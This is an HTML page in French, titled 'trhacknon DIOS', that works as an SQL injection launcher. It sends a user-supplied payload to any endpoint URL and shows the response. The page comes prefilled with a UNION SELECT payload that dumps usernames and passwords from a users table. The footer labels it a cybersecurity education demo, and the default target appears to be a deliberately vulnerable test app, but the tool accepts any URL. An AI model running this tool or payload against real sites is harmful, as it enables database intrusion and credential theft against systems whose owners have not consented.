<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>trhacknon DIOS</title>
    <style>
        body {
            background-color: #0d1117;
            color: #00ff6a;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        h1 {
            margin: 20px 0;
            font-size: 2.5em;
            color: #00ff6a;
            text-shadow: 0px 0px 8px #00ff6a;
        }
        p {
            color: #c9d1d9;
            margin: 10px;
        }
        input, button {
            background-color: #161b22;
            color: #00ff6a;
            border: 1px solid #00ff6a;
            padding: 10px;
            margin: 10px;
            width: 80%;
            max-width: 500px;
            font-size: 1em;
        }
        button {
            cursor: pointer;
            transition: all 0.3s ease;
        }
        button:hover {
            background-color: #00ff6a;
            color: #0d1117;
        }
        #result {
            margin-top: 20px;
            padding: 10px;
            background-color: #161b22;
            border: 1px solid #00ff6a;
            overflow-x: auto;
            max-height: 400px;
            color: #c9d1d9;
            font-family: monospace;
            text-align: left;
        }
        footer {
            margin-top: 20px;
            color: #c9d1d9;
            font-size: 0.8em;
        }
    </style>
</head>
<body>
    <h1>trhacknon DIOS</h1>
    <p>Testez l'efficacité d'une injection SQL sur l'endpoint vulnérable.</p>

    <label for="endpoint">URL de l'endpoint :</label>
    <input type="text" id="endpoint" value="https://sqli-trkn.replit.app/vulnerable.php" placeholder="https://example.com/vulnerable_endpoint">

    <label for="parameter">Paramètre vulnérable :</label>
    <input type="text" id="parameter" value="id" placeholder="Paramètre vulnérable">

    <label for="payload">Payload SQL :</label>
    <input type="text" id="payload" placeholder="Payload SQL ici" value="' UNION SELECT null, username, password FROM users -- -">

    <button onclick="executeInjection()">Lancer l'injection</button>

    <div id="result">Les résultats apparaîtront ici...</div>

    <footer>
        Démonstration DIOS par <b>trhacknon</b> — Éducation en cybersécurité
    </footer>

    <script>
        function executeInjection() {
            const endpoint = document.getElementById("endpoint").value;
            const parameter = document.getElementById("parameter").value;
            const payload = document.getElementById("payload").value;

            if (!endpoint || !parameter || !payload) {
                alert("Veuillez remplir tous les champs !");
                return;
            }

            const url = `${endpoint}?${encodeURIComponent(parameter)}=${encodeURIComponent(payload)}`;

            fetch(url)
                .then(response => response.text())
                .then(data => {
                    document.getElementById("result").innerText = data;
                    console.log("Dump réussi : ", data);
                })
                .catch(err => {
                    document.getElementById("result").innerText = "Erreur lors de l'injection. Vérifiez les détails dans la console.";
                    console.error("Injection échouée : ", err);
                });
        }
    </script>
</body>
</html>